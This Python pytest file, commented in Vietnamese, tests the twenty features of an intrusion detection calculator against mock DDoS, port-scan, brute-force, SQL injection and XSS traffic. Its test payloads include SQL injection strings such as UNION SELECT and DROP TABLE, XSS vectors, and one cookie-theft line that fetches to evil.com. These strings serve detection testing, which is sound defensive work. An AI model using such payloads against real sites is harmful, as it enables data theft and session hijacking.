"""
test_features_all.py — Automation test toàn bộ F1-F20

Mục tiêu: Verify mỗi feature có hoạt động đúng với từng kiểu tấn công.
Không cần network, không cần Mininet — chạy thuần Python bằng mock FlowState.

Chạy:
    cd System
    python3 -m pytest test/test_features_all.py -v
    python3 -m pytest test/test_features_all.py -v --tb=short  # compact
"""

import sys
import os
import time
import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.flow_state import FlowState
from core.layer_info import LayerInfo
from feature.calculator import FlowFeatureCalculator

# ============================================================================
# HELPERS — Tạo mock LayerInfo / FlowState
# ============================================================================

ATTACKER = "10.0.10.10"
SERVER   = "192.168.10.10"

def _pkt(timestamp=1.0, pkt_num=1,
         flags="PA", sport=5000, dport=443,
         tcp_seq=0,
         has_http=False, http_uri="/", http_method="GET",
         payload=b"", has_payload=False):
    """Tạo LayerInfo nhanh."""
    return LayerInfo(
        timestamp=timestamp,
        packet_number=pkt_num,
        has_ip=True,
        src_ip=ATTACKER, dst_ip=SERVER,
        protocol=6,
        has_tcp=True,
        tcp_sport=sport, tcp_dport=dport,
        tcp_flags=flags,
        tcp_seq=tcp_seq,
        has_http=has_http,
        http_method=http_method if has_http else None,
        http_uri=http_uri if has_http else None,
        has_payload=has_payload or bool(payload),
        payload_bytes=payload if payload else None,
        payload_length=len(payload),
    )

def _flow(fwd_pkts=None, bwd_pkts=None, window=9999.0):
    """Tạo FlowState và nạp packets.
    window=9999 để tránh sliding-window cleanup xóa mất packets khi test.
    """
    flow = FlowState(
        flow_key=(ATTACKER, SERVER, 5000, 443, 6),
        window_size=window
    )
    for p in (fwd_pkts or []):
        flow.add_forward_packet(p)
    for p in (bwd_pkts or []):
        flow.add_backward_packet(p)
    return flow

def _calc(fwd_pkts=None, bwd_pkts=None, window=9999.0):
    """Shortcut: tạo flow + tính features → dict (RAW values, không normalized)."""
    flow = _flow(fwd_pkts, bwd_pkts, window=window)
    calc = FlowFeatureCalculator()
    return calc.calculate_dict([flow])

# ============================================================================
# F1 — PacketRate
# ============================================================================

class TestF1_PacketRate:
    def test_high_rate_ddos(self):
        """DDoS: 100 packet cùng timestamp=1.0 trong window=1s → F1 raw = 100 pps."""
        pkts = [_pkt(timestamp=1.0, pkt_num=i) for i in range(100)]
        f = _calc(fwd_pkts=pkts, window=1.0)
        assert f['packet_rate'] > 50.0, f"F1={f['packet_rate']:.1f} pps quá thấp cho DDoS"

    def test_low_rate_normal(self):
        """Normal: 5 packet trong 4 giây → F1 raw thấp (< 2 pps)."""
        pkts = [_pkt(timestamp=float(i), pkt_num=i) for i in range(5)]
        f = _calc(fwd_pkts=pkts)
        assert f['packet_rate'] < 2.0, f"F1={f['packet_rate']:.3f} quá cao cho traffic bình thường"

    def test_zero_packets(self):
        """Không có packet → F1 = 0."""
        f = _calc(fwd_pkts=[])
        assert f['packet_rate'] == 0.0

# ============================================================================
# F2 — SynAckRatio
# ============================================================================

class TestF2_SynAckRatio:
    def test_syn_flood(self):
        """SYN Flood: 50 SYN fwd, 0 bwd SYN → F2 raw rất cao (> 10)."""
        pkts = [_pkt(flags="S", pkt_num=i) for i in range(50)]
        f = _calc(fwd_pkts=pkts)
        assert f['syn_ack_ratio'] > 10.0, f"F2={f['syn_ack_ratio']:.3f}"

    def test_normal_handshake(self):
        """Normal: 1 SYN fwd, 1 SYN-ACK bwd → F2 raw = 1.0 (cân bằng)."""
        fwd = [_pkt(flags="S", pkt_num=1), _pkt(flags="A", pkt_num=3)]
        bwd = [_pkt(flags="SA", pkt_num=2)]
        f = _calc(fwd_pkts=fwd, bwd_pkts=bwd)
        # Flood: ratio >> 1. Normal: fwd_SYN=1, bwd_SYN=1 → ratio=1.0
        assert f['syn_ack_ratio'] <= 1.0, f"F2={f['syn_ack_ratio']:.3f}"

# ============================================================================
# F3 — InterArrivalTime
# ============================================================================

class TestF3_InterArrivalTime:
    def test_automated_fast_attack(self):
        """Automated attack: IAT rất nhỏ (1ms) → F3 raw < 0.01s."""
        pkts = [_pkt(timestamp=0.001 * i, pkt_num=i) for i in range(20)]
        f = _calc(fwd_pkts=pkts)
        assert f['inter_arrival_time'] < 0.01, f"F3={f['inter_arrival_time']:.4f}"

    def test_human_browsing(self):
        """Human: IAT lớn (1.5s/request) → F3 raw ≈ 1.5s."""
        pkts = [_pkt(timestamp=float(i) * 1.5, pkt_num=i) for i in range(5)]
        f = _calc(fwd_pkts=pkts)
        assert f['inter_arrival_time'] > 1.0, f"F3={f['inter_arrival_time']:.3f}"

    def test_single_packet_returns_zero(self):
        """1 packet → không tính được IAT → F3 = 0."""
        f = _calc(fwd_pkts=[_pkt()])
        assert f['inter_arrival_time'] == 0.0

# ============================================================================
# F4 — RstRatio
# ============================================================================

class TestF4_RstRatio:
    def test_port_scan_high_rst(self):
        """Port scan: nhiều RST (port đóng) → F4 cao."""
        pkts = [_pkt(flags="R", pkt_num=i) for i in range(20)]
        f = _calc(fwd_pkts=pkts)
        assert f['rst_ratio'] > 0.5, f"F4={f['rst_ratio']:.3f}"

    def test_normal_no_rst(self):
        """Normal: không có RST → F4 = 0."""
        pkts = [_pkt(flags="PA", pkt_num=i) for i in range(10)]
        f = _calc(fwd_pkts=pkts)
        assert f['rst_ratio'] == 0.0, f"F4={f['rst_ratio']:.3f}"

    def test_bounded_0_1(self):
        """F4 luôn trong [0, 1]."""
        pkts = [_pkt(flags="R", pkt_num=i) for i in range(100)]
        f = _calc(fwd_pkts=pkts)
        assert 0.0 <= f['rst_ratio'] <= 1.0

# ============================================================================
# F5 — DistinctPorts
# ============================================================================

class TestF5_DistinctPorts:
    def test_port_scan_many_ports(self):
        """Port scan: mỗi packet đến cổng khác nhau → F5 raw = 100 ports."""
        pkts = [_pkt(dport=1000 + i, pkt_num=i) for i in range(100)]
        f = _calc(fwd_pkts=pkts)
        assert f['distinct_ports'] >= 100, f"F5={f['distinct_ports']:.0f}"

    def test_normal_single_port(self):
        """Normal: tất cả đến port 443 → F5 raw = 1."""
        pkts = [_pkt(dport=443, pkt_num=i) for i in range(10)]
        f = _calc(fwd_pkts=pkts)
        assert f['distinct_ports'] == 1, f"F5={f['distinct_ports']:.0f}"

# ============================================================================
# F6 — URLConcentration
# ============================================================================

class TestF6_URLConcentration:
    def test_brute_force_same_url(self):
        """Brute force: tất cả đến /login → F6 = 1.0."""
        pkts = [_pkt(has_http=True, http_uri="/login", pkt_num=i,
                     payload=b"POST /login", has_payload=True) for i in range(20)]
        f = _calc(fwd_pkts=pkts)
        assert f['url_concentration'] >= 0.9, f"F6={f['url_concentration']:.3f}"

    def test_normal_many_urls(self):
        """Normal: browse nhiều trang → F6 thấp."""
        urls = ["/", "/products", "/about", "/contact", "/blog",
                "/login", "/cart", "/checkout", "/faq", "/search"]
        pkts = [_pkt(has_http=True, http_uri=urls[i % len(urls)],
                     pkt_num=i, payload=b"GET", has_payload=True) for i in range(20)]
        f = _calc(fwd_pkts=pkts)
        assert f['url_concentration'] < 0.5, f"F6={f['url_concentration']:.3f}"

    def test_no_http_returns_zero(self):
        """Không có HTTP → F6 = 0."""
        pkts = [_pkt(has_http=False, pkt_num=i) for i in range(10)]
        f = _calc(fwd_pkts=pkts)
        assert f['url_concentration'] == 0.0

# ============================================================================
# F7 — HttpIatUniformity
# ============================================================================

class TestF7_HttpIatUniformity:
    def test_bot_uniform_timing(self):
        """Bot brute force: đều đặn mỗi 100ms → F7 cao."""
        pkts = [_pkt(has_http=True, http_uri="/login",
                     timestamp=0.1 * i, pkt_num=i,
                     payload=b"GET /login", has_payload=True) for i in range(15)]
        f = _calc(fwd_pkts=pkts)
        assert f['http_iat_uniformity'] > 0.7, f"F7={f['http_iat_uniformity']:.3f}"

    def test_human_random_timing(self):
        """Human: timing không đều → F7 thấp."""
        times = [0.0, 0.5, 0.8, 2.1, 2.5, 5.0, 5.1, 8.0]
        pkts = [_pkt(has_http=True, http_uri=f"/page{i}",
                     timestamp=times[i], pkt_num=i,
                     payload=b"GET", has_payload=True) for i in range(len(times))]
        f = _calc(fwd_pkts=pkts)
        assert f['http_iat_uniformity'] < 0.8, f"F7={f['http_iat_uniformity']:.3f}"

    def test_single_http_returns_zero(self):
        """1 HTTP request → không có IAT → F7 = 0."""
        pkts = [_pkt(has_http=True, http_uri="/login", pkt_num=1,
                     payload=b"GET /login", has_payload=True)]
        f = _calc(fwd_pkts=pkts)
        assert f['http_iat_uniformity'] == 0.0

# ============================================================================
# F8 — RequestSizeUniformity
# ============================================================================

class TestF8_RequestSizeUniformity:
    def test_bot_uniform_payload(self):
        """Bot: mỗi request cùng kích thước → F8 cao."""
        payload = b"username=admin&password=test1234"
        pkts = [_pkt(has_http=True, http_uri="/login", pkt_num=i,
                     payload=payload, has_payload=True) for i in range(10)]
        f = _calc(fwd_pkts=pkts)
        assert f['request_size_uniformity'] > 0.8, f"F8={f['request_size_uniformity']:.3f}"

    def test_human_varied_payload(self):
        """Human: payload khác nhau mỗi request → F8 thấp."""
        payloads = [b"a" * n for n in [10, 200, 50, 1000, 30, 500, 15, 800, 5, 300]]
        pkts = [_pkt(has_http=True, http_uri="/search", pkt_num=i,
                     payload=payloads[i], has_payload=True) for i in range(len(payloads))]
        f = _calc(fwd_pkts=pkts)
        assert f['request_size_uniformity'] < 0.7, f"F8={f['request_size_uniformity']:.3f}"

    def test_less_than_3_returns_zero(self):
        """< 3 HTTP requests → F8 = 0 (không đủ data)."""
        pkts = [_pkt(has_http=True, http_uri="/login", pkt_num=i,
                     payload=b"test", has_payload=True) for i in range(2)]
        f = _calc(fwd_pkts=pkts)
        assert f['request_size_uniformity'] == 0.0

# ============================================================================
# F9 — AvgPayloadSize
# ============================================================================

class TestF9_AvgPayloadSize:
    def test_syn_flood_no_payload(self):
        """SYN Flood: không có payload → F9 = 0."""
        pkts = [_pkt(flags="S", payload=b"", pkt_num=i) for i in range(50)]
        f = _calc(fwd_pkts=pkts)
        assert f['avg_payload_size'] == 0.0, f"F9={f['avg_payload_size']:.3f}"

    def test_normal_has_payload(self):
        """Normal HTTP: có payload → F9 > 0."""
        pkts = [_pkt(payload=b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n",
                     pkt_num=i, has_payload=True) for i in range(5)]
        f = _calc(fwd_pkts=pkts)
        assert f['avg_payload_size'] > 0.0, f"F9={f['avg_payload_size']:.3f}"

# ============================================================================
# F10 — FwdBwdRatio
# ============================================================================

class TestF10_FwdBwdRatio:
    def test_syn_flood_asymmetric(self):
        """SYN Flood: 100 fwd, 2 bwd → F10 raw = 50.0 (rất cao)."""
        fwd = [_pkt(flags="S", pkt_num=i) for i in range(100)]
        bwd = [_pkt(flags="SA", pkt_num=i) for i in range(2)]
        f = _calc(fwd_pkts=fwd, bwd_pkts=bwd)
        assert f['fwd_bwd_ratio'] > 10.0, f"F10={f['fwd_bwd_ratio']:.3f}"

    def test_normal_bidirectional(self):
        """Normal: fwd=5, bwd=5 → F10 raw = 1.0 (cân bằng)."""
        fwd = [_pkt(flags="PA", pkt_num=i) for i in range(5)]
        bwd = [_pkt(flags="PA", pkt_num=i) for i in range(5)]
        f = _calc(fwd_pkts=fwd, bwd_pkts=bwd)
        assert f['fwd_bwd_ratio'] <= 1.0, f"F10={f['fwd_bwd_ratio']:.3f}"

# ============================================================================
# F11 — PacketsPerPort
# ============================================================================

class TestF11_PacketsPerPort:
    def test_port_scan_one_per_port(self):
        """Port scan: 50 pkts / 50 ports → F11 raw = 1.0 pkt/port."""
        pkts = [_pkt(dport=1000 + i, pkt_num=i) for i in range(50)]
        f = _calc(fwd_pkts=pkts)
        assert f['packets_per_port'] <= 1.0, f"F11={f['packets_per_port']:.3f}"

    def test_normal_many_packets_one_port(self):
        """Normal: 50 pkts / 1 port → F11 raw = 50 (cao hơn nhiều so với scan)."""
        pkts = [_pkt(dport=443, pkt_num=i) for i in range(50)]
        f = _calc(fwd_pkts=pkts)
        assert f['packets_per_port'] > 10.0, f"F11={f['packets_per_port']:.3f}"

# ============================================================================
# F12 — SqlSpecialChar
# ============================================================================

class TestF12_SqlSpecialChar:
    def test_sqli_special_chars(self):
        """SQLi: chứa ' ; # → F12 > 0."""
        payload = b"GET /search?q=' OR 1=1; -- HTTP/1.1\r\n\r\n"
        pkts = [_pkt(has_http=True, http_uri="/search?q=' OR 1=1",
                     payload=payload, has_payload=True, pkt_num=i) for i in range(5)]
        f = _calc(fwd_pkts=pkts)
        assert f['sql_special_char'] > 0.0, f"F12={f['sql_special_char']:.4f}"

    def test_normal_no_special_chars(self):
        """Normal: không có SQL special chars → F12 = 0."""
        payload = b"GET /products?category=shoes HTTP/1.1\r\n\r\n"
        pkts = [_pkt(has_http=True, http_uri="/products?category=shoes",
                     payload=payload, has_payload=True, pkt_num=i) for i in range(5)]
        f = _calc(fwd_pkts=pkts)
        assert f['sql_special_char'] == 0.0, f"F12={f['sql_special_char']:.4f}"

# ============================================================================
# F13 — CrsSqliScore
# ============================================================================

class TestF13_CrsSqliScore:
    def test_sqli_union_select(self):
        """SQLi UNION SELECT → F13 > 0."""
        payload = b"GET /page?id=1 UNION SELECT username,password FROM users-- HTTP/1.1\r\n\r\n"
        pkts = [_pkt(has_http=True, http_uri="/page?id=1 UNION SELECT username,password FROM users--",
                     payload=payload, has_payload=True, pkt_num=i) for i in range(3)]
        f = _calc(fwd_pkts=pkts)
        assert f['crs_sqli_score'] > 0.0, f"F13={f['crs_sqli_score']:.4f}"

    def test_normal_no_sqli(self):
        """Normal request → F13 = 0."""
        payload = b"GET /products/shoes HTTP/1.1\r\nHost: shop.local\r\n\r\n"
        pkts = [_pkt(has_http=True, http_uri="/products/shoes",
                     payload=payload, has_payload=True, pkt_num=i) for i in range(3)]
        f = _calc(fwd_pkts=pkts)
        assert f['crs_sqli_score'] == 0.0, f"F13={f['crs_sqli_score']:.4f}"

# ============================================================================
# F14 — SqlUnionSelect
# ============================================================================

class TestF14_SqlUnionSelect:
    def test_union_select_detected(self):
        """UNION SELECT pattern → F14 = 1."""
        payload = b"' UNION SELECT * FROM users--"
        pkts = [_pkt(has_http=True, http_uri="/search",
                     payload=payload, has_payload=True, pkt_num=1)]
        f = _calc(fwd_pkts=pkts)
        assert f['sql_union_select'] == 1.0, f"F14={f['sql_union_select']}"

    def test_normal_no_union(self):
        """Normal → F14 = 0."""
        payload = b"GET /search?q=laptop HTTP/1.1\r\n\r\n"
        pkts = [_pkt(has_http=True, http_uri="/search?q=laptop",
                     payload=payload, has_payload=True, pkt_num=1)]
        f = _calc(fwd_pkts=pkts)
        assert f['sql_union_select'] == 0.0

# ============================================================================
# F15 — SqlComment
# ============================================================================

class TestF15_SqlComment:
    def test_sql_comment_double_dash(self):
        """-- comment → F15 = 1."""
        payload = b"admin'--"
        pkts = [_pkt(has_http=True, http_uri="/login",
                     payload=payload, has_payload=True, pkt_num=1)]
        f = _calc(fwd_pkts=pkts)
        assert f['sql_comment'] == 1.0, f"F15={f['sql_comment']}"

    def test_sql_comment_hash(self):
        """# comment → F15 = 1."""
        payload = b"admin'#"
        pkts = [_pkt(has_http=True, http_uri="/login",
                     payload=payload, has_payload=True, pkt_num=1)]
        f = _calc(fwd_pkts=pkts)
        assert f['sql_comment'] == 1.0, f"F15={f['sql_comment']}"

    def test_normal_no_comment(self):
        """Normal → F15 = 0."""
        payload = b"username=admin&password=secret"
        pkts = [_pkt(has_http=True, http_uri="/login",
                     payload=payload, has_payload=True, pkt_num=1)]
        f = _calc(fwd_pkts=pkts)
        assert f['sql_comment'] == 0.0

# ============================================================================
# F16 — SqlStackedQuery
# ============================================================================

class TestF16_SqlStackedQuery:
    def test_stacked_query_drop(self):
        """Stacked query với DROP → F16 = 1."""
        payload = b"1; DROP TABLE users--"
        pkts = [_pkt(has_http=True, http_uri="/page",
                     payload=payload, has_payload=True, pkt_num=1)]
        f = _calc(fwd_pkts=pkts)
        assert f['sql_stacked_query'] == 1.0, f"F16={f['sql_stacked_query']}"

    def test_normal_no_stacked(self):
        """Normal → F16 = 0."""
        payload = b"id=1&name=john"
        pkts = [_pkt(has_http=True, http_uri="/api",
                     payload=payload, has_payload=True, pkt_num=1)]
        f = _calc(fwd_pkts=pkts)
        assert f['sql_stacked_query'] == 0.0

# ============================================================================
# F17 — SqlSelectCount
# ============================================================================

class TestF17_SqlSelectCount:
    def test_select_in_payload(self):
        """SELECT keyword → F17 > 0."""
        payload = b"' OR SELECT * FROM users WHERE '1'='1"
        pkts = [_pkt(has_http=True, http_uri="/search",
                     payload=payload, has_payload=True, pkt_num=1)]
        f = _calc(fwd_pkts=pkts)
        assert f['sql_select_count'] > 0.0, f"F17={f['sql_select_count']}"

    def test_no_select(self):
        """Không có SELECT → F17 = 0."""
        payload = b"name=John&age=25"
        pkts = [_pkt(has_http=True, http_uri="/register",
                     payload=payload, has_payload=True, pkt_num=1)]
        f = _calc(fwd_pkts=pkts)
        assert f['sql_select_count'] == 0.0

# ============================================================================
# F18 — CrsXssScore
# ============================================================================

class TestF18_CrsXssScore:
    def test_xss_script_tag(self):
        """<script> tag → F18 > 0."""
        payload = b"<script>alert('XSS')</script>"
        pkts = [_pkt(has_http=True, http_uri="/search",
                     payload=payload, has_payload=True, pkt_num=1)]
        f = _calc(fwd_pkts=pkts)
        assert f['crs_xss_score'] > 0.0, f"F18={f['crs_xss_score']}"

    def test_normal_no_xss(self):
        """Normal → F18 = 0."""
        payload = b"q=laptop+computer&category=electronics"
        pkts = [_pkt(has_http=True, http_uri="/search",
                     payload=payload, has_payload=True, pkt_num=1)]
        f = _calc(fwd_pkts=pkts)
        assert f['crs_xss_score'] == 0.0, f"F18={f['crs_xss_score']}"

# ============================================================================
# F19 — JsFunctionCall
# ============================================================================

class TestF19_JsFunctionCall:
    def test_alert_detected(self):
        """alert() → F19 = 1."""
        payload = b"<img src=x onerror=alert(1)>"
        pkts = [_pkt(has_http=True, http_uri="/page",
                     payload=payload, has_payload=True, pkt_num=1)]
        f = _calc(fwd_pkts=pkts)
        assert f['js_function_call'] == 1.0, f"F19={f['js_function_call']}"

    def test_document_cookie(self):
        """document.cookie → F19 = 1."""
        payload = b"fetch('https://evil.com?c='+document.cookie)"
        pkts = [_pkt(has_http=True, http_uri="/search",
                     payload=payload, has_payload=True, pkt_num=1)]
        f = _calc(fwd_pkts=pkts)
        assert f['js_function_call'] == 1.0, f"F19={f['js_function_call']}"

    def test_normal_no_js(self):
        """Normal → F19 = 0."""
        payload = b"username=admin&password=password123"
        pkts = [_pkt(has_http=True, http_uri="/login",
                     payload=payload, has_payload=True, pkt_num=1)]
        f = _calc(fwd_pkts=pkts)
        assert f['js_function_call'] == 0.0

# ============================================================================
# F20 — HtmlEventHandler
# ============================================================================

class TestF20_HtmlEventHandler:
    def test_onerror_detected(self):
        """onerror= → F20 = 1."""
        payload = b"<img src=x onerror=alert(1)>"
        pkts = [_pkt(has_http=True, http_uri="/page",
                     payload=payload, has_payload=True, pkt_num=1)]
        f = _calc(fwd_pkts=pkts)
        assert f['html_event_handler'] == 1.0, f"F20={f['html_event_handler']}"

    def test_onload_detected(self):
        """onload= → F20 = 1."""
        payload = b"<body onload=alert('XSS')>"
        pkts = [_pkt(has_http=True, http_uri="/page",
                     payload=payload, has_payload=True, pkt_num=1)]
        f = _calc(fwd_pkts=pkts)
        assert f['html_event_handler'] == 1.0, f"F20={f['html_event_handler']}"

    def test_normal_no_event_handler(self):
        """Normal → F20 = 0."""
        payload = b"comment=Nice+product&rating=5"
        pkts = [_pkt(has_http=True, http_uri="/review",
                     payload=payload, has_payload=True, pkt_num=1)]
        f = _calc(fwd_pkts=pkts)
        assert f['html_event_handler'] == 0.0

# ============================================================================
# INTEGRATION — Kiểm tra attack scenario đầy đủ
# ============================================================================

class TestAttackScenarios:
    def test_ddos_profile(self):
        """DDoS: F1 cao (> 50 pps), F3 thấp (< 0.01s), F9 = 0."""
        pkts = [_pkt(flags="S", timestamp=1.0, pkt_num=i) for i in range(200)]
        f = _calc(fwd_pkts=pkts, window=1.0)
        assert f['packet_rate'] > 50.0,         "DDoS: F1 phải > 50 pps"
        assert f['inter_arrival_time'] < 0.01,  "DDoS: F3 phải < 0.01s"
        assert f['avg_payload_size'] == 0.0,    "DDoS: F9 phải = 0 (no payload)"

    def test_port_scan_profile(self):
        """Port scan: F5 raw >= 100 ports, F4 > 0, F11 raw = 1 pkt/port."""
        pkts = [_pkt(dport=1000 + i, flags="SR", pkt_num=i) for i in range(100)]
        f = _calc(fwd_pkts=pkts)
        assert f['distinct_ports'] >= 100,      "PortScan: F5 phải >= 100"
        assert f['rst_ratio'] > 0.0,            "PortScan: F4 phải > 0"
        assert f['packets_per_port'] <= 1.0,    "PortScan: F11 = 1 pkt/port"

    def test_brute_force_profile(self):
        """Brute Force: F6 = 1.0, F7 > 0.7, F8 > 0.8."""
        payload = b"username=admin&password=test"
        pkts = [_pkt(has_http=True, http_uri="/login",
                     timestamp=0.1 * i, pkt_num=i,
                     payload=payload, has_payload=True) for i in range(20)]
        f = _calc(fwd_pkts=pkts)
        assert f['url_concentration'] >= 1.0,   "BruteForce: F6 phải = 1.0"
        assert f['http_iat_uniformity'] > 0.7,  "BruteForce: F7 phải cao"
        assert f['request_size_uniformity'] > 0.8, "BruteForce: F8 phải cao"

    def test_sqli_profile(self):
        """SQLi: F12 > 0, F13 > 0, ít nhất 1 trong F14/F15/F16/F17 = 1."""
        payload = b"' UNION SELECT username,password FROM users-- "
        pkts = [_pkt(has_http=True, http_uri="/search",
                     payload=payload, has_payload=True, pkt_num=i) for i in range(5)]
        f = _calc(fwd_pkts=pkts)
        assert f['sql_special_char'] > 0.0,     "SQLi: F12 phải > 0"
        assert f['crs_sqli_score'] > 0.0,       "SQLi: F13 phải > 0"
        sqli_binary = (f['sql_union_select'] + f['sql_comment'] +
                       f['sql_stacked_query'] + f['sql_select_count'])
        assert sqli_binary > 0.0,                   "SQLi: ít nhất 1 binary feature phải = 1"

    def test_xss_profile(self):
        """XSS: F18 > 0, ít nhất 1 trong F19/F20 = 1."""
        payload = b"<script>alert(document.cookie)</script>"
        pkts = [_pkt(has_http=True, http_uri="/comment",
                     payload=payload, has_payload=True, pkt_num=i) for i in range(5)]
        f = _calc(fwd_pkts=pkts)
        assert f['crs_xss_score'] > 0.0,        "XSS: F18 phải > 0"
        xss_binary = f['js_function_call'] + f['html_event_handler']
        assert xss_binary > 0.0,                    "XSS: ít nhất 1 binary feature phải = 1"

    def test_normal_traffic_all_low(self):
        """Normal traffic: tất cả attack features phải = 0."""
        urls = ["/", "/products", "/about", "/contact", "/blog"]
        pkts = [_pkt(has_http=True, http_uri=urls[i % len(urls)],
                     timestamp=float(i) * 2.0, pkt_num=i,
                     payload=b"normal browsing request", has_payload=True)
                for i in range(10)]
        f = _calc(fwd_pkts=pkts)
        assert f['sql_special_char'] == 0.0,    "Normal: F12 phải = 0"
        assert f['crs_sqli_score'] == 0.0,      "Normal: F13 phải = 0"
        assert f['sql_union_select'] == 0.0,    "Normal: F14 phải = 0"
        assert f['sql_comment'] == 0.0,        "Normal: F15 phải = 0"
        assert f['crs_xss_score'] == 0.0,       "Normal: F18 phải = 0"
        assert f['js_function_call'] == 0.0,    "Normal: F19 phải = 0"
        assert f['html_event_handler'] == 0.0,  "Normal: F20 phải = 0"

# ============================================================================
# NORMALIZATION — Kiểm tra output luôn trong [0, 1]
# ============================================================================

class TestNormalization:
    def test_all_features_in_0_1(self):
        """Tất cả normalized features phải trong [0, 1]."""
        pkts = [_pkt(flags="S", timestamp=0.01 * i, dport=1000 + i,
                     pkt_num=i) for i in range(100)]
        flow = _flow(fwd_pkts=pkts)
        calc = FlowFeatureCalculator()
        norm = calc.calculate_normalized([flow])
        assert len(norm) == 20, f"Phải có 20 features, có {len(norm)}"
        for i, v in enumerate(norm):
            assert 0.0 <= v <= 1.0, f"Feature index {i} = {v} nằm ngoài [0,1]"

    def test_feature_count_is_20(self):
        """calculate_dict() phải trả về đúng 20 features."""
        f = _calc(fwd_pkts=[_pkt()])
        assert len(f) == 20, f"Có {len(f)} features, expected 20"

    def test_feature_names_correct(self):
        """calculate_dict() phải trả về đúng 20 keys dạng snake_case."""
        expected_keys = [
            'packet_rate', 'syn_ack_ratio', 'inter_arrival_time', 'rst_ratio',
            'distinct_ports', 'url_concentration', 'http_iat_uniformity',
            'request_size_uniformity', 'avg_payload_size', 'fwd_bwd_ratio',
            'packets_per_port', 'sql_special_char', 'crs_sqli_score',
            'sql_union_select', 'sql_comment', 'sql_stacked_query',
            'sql_select_count', 'crs_xss_score', 'js_function_call',
            'html_event_handler'
        ]
        f = _calc(fwd_pkts=[_pkt()])
        for key in expected_keys:
            assert key in f, f"Thiếu feature key: '{key}'"
